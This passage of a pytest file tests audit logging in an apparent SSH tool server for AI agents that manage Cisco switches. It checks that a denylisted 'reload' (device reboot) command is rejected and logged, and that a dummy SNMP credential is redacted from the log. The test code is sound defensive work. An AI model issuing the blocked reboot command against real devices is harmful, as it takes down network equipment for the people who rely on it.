    # A denylist rejection raises before connecting — it must still be audited.
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=str(log)))
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "reload"},
            )
    rec = json.loads(log.read_text().splitlines()[0])
    assert rec["tool"] == "ssh_run_command"
    assert rec["commands"] == ["reload"]
    assert rec["outcome"] == "error"
    assert rec["error"]


async def test_audit_log_redacts_commands(tmp_path):
    # A credential in a config command must not land in the audit log.
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(write_enabled=True, audit_log=str(log)))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["snmp-server community SECRETAUDIT ro"],
                    "confirm": "yes",
                },
            )
    body = log.read_text()
    assert "SECRETAUDIT" not in body
    rec = json.loads(body.splitlines()[0])
    assert "<REDACTED>" in rec["commands"][0]


async def test_audit_log_disabled_writes_nothing(tmp_path):
    log = tmp_path / "audit.jsonl"
    mcp = build_server(make_settings(audit_log=None))  # auditing off
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
            )
    assert not log.exists()  # no middleware registered → no audit file
